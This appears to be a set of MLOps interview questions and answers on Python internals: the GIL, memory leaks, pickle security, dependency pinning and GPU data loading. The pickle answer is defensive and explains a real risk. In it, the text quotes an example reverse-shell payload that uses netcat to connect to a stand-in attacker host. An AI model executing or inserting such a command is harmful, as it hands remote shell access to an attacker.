# Python internals for MLOps - Interview Questions

## Q1: How does the Global Interpreter Lock (GIL) impact ML model serving, and how do you bypass it?

**Real-world context:**
A team deployed a Scikit-Learn model using a standard Flask app running with 1 Gunicorn worker and 10 threads. Under load testing, throughput flatlined at 15 requests per second, and CPU utilization was stuck at exactly 100% on 1 core, while the other 15 cores on the machine sat completely idle. 

**Answer:**

**The Root Cause (The GIL):**
CPython (the standard Python implementation) uses the Global Interpreter Lock. It is a mutex that protects access to Python objects, preventing multiple threads from executing Python bytecodes at once.
Even if you have 10 threads, only *one* thread can execute Python code at any given microsecond. 

If your ML inference is pure math in C/C++ (like NumPy matrix multiplication or PyTorch forward passes), those libraries actually *release* the GIL while computing. However, the data preprocessing (JSON parsing, Pandas manipulation, dictionary lookups) happening *before* the model predict call is pure Python. If 10 requests hit at once, they wait in line sequentially for the GIL to do the JSON parsing.

**The Fix (Multiprocessing):**
Threads share memory (impacted by the GIL). Processes do not share memory (they bypass the GIL).

1.  **Gunicorn Workers:** We changed the Gunicorn config from `workers=1, threads=10` to `workers=8, threads=1`. 
2.  Now the OS spawns 8 entirely separate Python processes. Each has its own GIL. The OS load balances incoming HTTP requests across all 8. 
3.  Throughput instantly jumped to 120 requests per second, utilizing 8 CPU cores.

**The Trade-off (Memory):**
Because processes don't share memory, if your model is 1GB, spinning up 8 Gunicorn workers means loading the model 8 times into RAM (8GB total). In K8s, this usually causes an OOM kill. 

To bypass the GIL *and* save memory, I migrate teams off Flask/Gunicorn entirely and onto **KServe, Ray Serve, or Triton**, which use shared-memory abstractions to load the model once while using multiple processes to handle concurrent requests.

---

## Q2: How do you profile and fix a memory leak in a long-running ML inference microservice?

**Real-world context:**
Our background Celery worker processing NLP sentiment analysis slowly consumed more and more memory over 48 hours until K8s killed it (`OOMKilled`). It would restart, and the cycle would repeat.

**Answer:**

Python has a garbage collector (reference counting), so memory leaks aren't like C++ `malloc` leaks. In Python, a "memory leak" means you are unintentionally holding onto a reference to an object, preventing the garbage collector from deleting it.

**Debugging Steps:**

1.  **Is it a Python leak or a C-extension leak?**
    *   ML uses heavy C-extensions (Pandas, PyTorch, TensorFlow). If memory is growing but Python's `sys.getsizeof()` doesn't show large objects, the leak is happening down in the C/C++ layer (e.g., a PyTorch tensor not being freed, or a Pandas memory fragmentation issue).
2.  **Using `tracemalloc`:**
    *   I injected Python's built-in `tracemalloc` module into the staging service. 
    *   I took a snapshot of memory allocations at Startup, and another snapshot after 10,000 requests.
    *   `snapshot2.compare_to(snapshot1, 'lineno')` printed the exact line of Python code responsible for the largest memory growth.
3.  **Using `objgraph`:**
    *   If `tracemalloc` shows millions of `dict` or `list` objects being created, `objgraph.show_backrefs()` generates a visual graph showing *what* is holding the reference.

**The Fix (Real Examples):**
1.  **The Logging Trap:** The application was appending prediction results to a global list meant for batch logging, but the flush logic was bugged. The list grew infinitely.
2.  **The ML Framework Trap:** In PyTorch, someone was saving loss values for monitoring like this: `losses.append(loss)`. But `loss` is a PyTorch tensor connected to the entire computational graph. It was holding the entire 2GB graph in memory! The fix: `losses.append(loss.item())` to extract just the float value.

---

## Q3: Explain why Pickle is dangerous for ML model serialization and what you use instead.

**Real-world context:**
I failed an internal security audit because our ML platform was deserializing `scikit-learn` `.pkl` models directly from a user-provided S3 bucket. The security engineer demonstrated how he could gain a reverse shell on our production Kubernetes cluster just by uploading a modified model.

**Answer:**

**The Danger of Pickle:**
Python's `pickle` module is not just a data serialization format (like JSON). It serializes arbitrary Python *objects*, and crucially, it allows executing arbitrary Python code during deserialization via the `__reduce__` method.

If an attacker modifies a `model.pkl` file to include a malicious `__reduce__` method that calls `os.system("nc -e /bin/sh attacker.com 4444")`, the moment you call `pickle.load(file)` to serve the model, the code executes with the privileges of your ML inference pod.

**Production Alternatives:**

1.  **ONNX (Open Neural Network Exchange):**
    *   The industry standard. It stores the mathematical graph of the model (nodes, weights, operations) using Protobuf, not arbitrary Python code. It is impossible to execute a shell script via an ONNX load.
    *   Bonus: ONNX models can be optimized and run on C++ runtimes (ONNX Runtime) bypassing Python entirely.
2.  **TorchScript / Safetensors:**
    *   If staying strictly in PyTorch, use `safetensors` instead of `torch.save()` (which uses pickle under the hood). `safetensors` is a zero-copy, secure format developed by HuggingFace that only stores tensors, no code.
3.  **Joblib:**
    *   For Scikit-learn, `joblib` is often used instead of `pickle` because it handles large NumPy arrays better, but *it is still inherently insecure* against malicious payloads. If you must use Scikit-learn formats, the loading mechanism must be strictly air-gapped and the artifact's SHA256 hash verified against the CI/CD pipeline signature.

---

## Q4: How do you manage Python dependencies in production ML systems to guarantee reproducibility? 

**Real-world context:**
A model worked locally. It passed CI/CD. It was deployed. The next day, K8s autoscaled and spun up a new pod. That new pod instantly crashed on startup with `AttributeError: module 'numpy' has no attribute 'X'`.

**Answer:**

**The Root Cause:**
Our `requirements.txt` looked like this:
```text
scikit-learn==1.0.2
pandas>=1.3.0
numpy
```
When the autoscaler built the new Docker image (because `imagePullPolicy: Always` was accidentally set), it pulled the absolute latest version of `numpy` published that morning, which introduced a breaking change that conflicted with `scikit-learn`. 

**The Fix (Deterministic Builds):**
Never use raw `requirements.txt` or `pip install` in production. You must pin the entire dependency tree (including transitive dependencies).

1.  **Poetry or Pipenv:** We migrated to Poetry. It resolves the dependency tree and generates a `poetry.lock` file containing the exact versions and cryptographic hashes of every package.
2.  **Docker Multi-stage Builds:** In our `Dockerfile`, we copy the `poetry.lock` and install strictly from it. This guarantees that a container built today is byte-for-byte identical to a container built 6 months from now.
    ```dockerfile
    RUN pip install poetry
    COPY pyproject.toml poetry.lock ./
    RUN poetry export -f requirements.txt --output reqs.txt
    RUN pip install --no-cache-dir -r reqs.txt
    ```

**Handling CUDA dependencies:**
Python dependency managers are terrible at handling C++ system libraries (CUDA, cuDNN). `pip install torch` might pull a version compiled for CUDA 11.8, but the host K8s node driver is running CUDA 11.4.
*   **Best Practice:** Use official NVIDIA PyTorch base images (`nvcr.io/nvidia/pytorch:XX.XX-py3`) as your Docker `FROM` image. These have CUDA, NCCL, and TensorRT perfectly matched to the PyTorch wheel. Then, use Poetry strictly for your application-level Python packages on top of it.

---

## Q5: How do you write an efficient data loader in Python to prevent GPU starvation?

**Real-world context:**
We were training on 10 million images. The A100 GPU was sitting at 15% utilization. The data scientists were using standard Python `for` loops to open JPEGs from disk and convert them to NumPy arrays before passing them to PyTorch.

**Answer:**

**The Problem:**
Python is slow. Disk I/O is slow. If the CPU takes 50ms to open, decode, and resize an image, and the GPU takes 5ms to compute the forward/backward pass, the GPU sits idle for 45ms. 

**My Production Data Loading Strategy:**

1.  **PyTorch `DataLoader` (Multiprocessing):**
    *   Never load data on the main thread. 
    *   Set `num_workers=8` (or equal to CPU cores). This spawns multiple Python background processes that read and augment images concurrently, placing them in a queue for the GPU.
2.  **Pinned Memory (`pin_memory=True`):**
    *   By default, moving data from CPU RAM to GPU VRAM requires a bounce through a staging area in the OS.
    *   Setting `pin_memory=True` allocates page-locked memory on the CPU. The GPU can use DMA (Direct Memory Access) to pull the tensors directly from CPU RAM via the PCIe bus without involving the CPU, drastically speeding up transfer times.
3.  **Prefetching:**
    *   Use `prefetch_factor=2`. This tells the background workers to always have 2 batches ready and waiting in CPU memory, so the moment the GPU finishes batch N, batch N+1 is instantly transferred.
4.  **Avoid Python for Heavy Augmentations:**
    *   Doing heavy matrix rotations on images using Python libraries like `Pillow` or `OpenCV` hits the CPU hard.
    *   I moved all image augmentations to **NVIDIA DALI (Data Loading Library)** or PyTorch's `torchvision.transforms.v2`. DALI moves the JPEG decoding and image resizing directly onto the GPU, completely bypassing the CPU bottleneck.
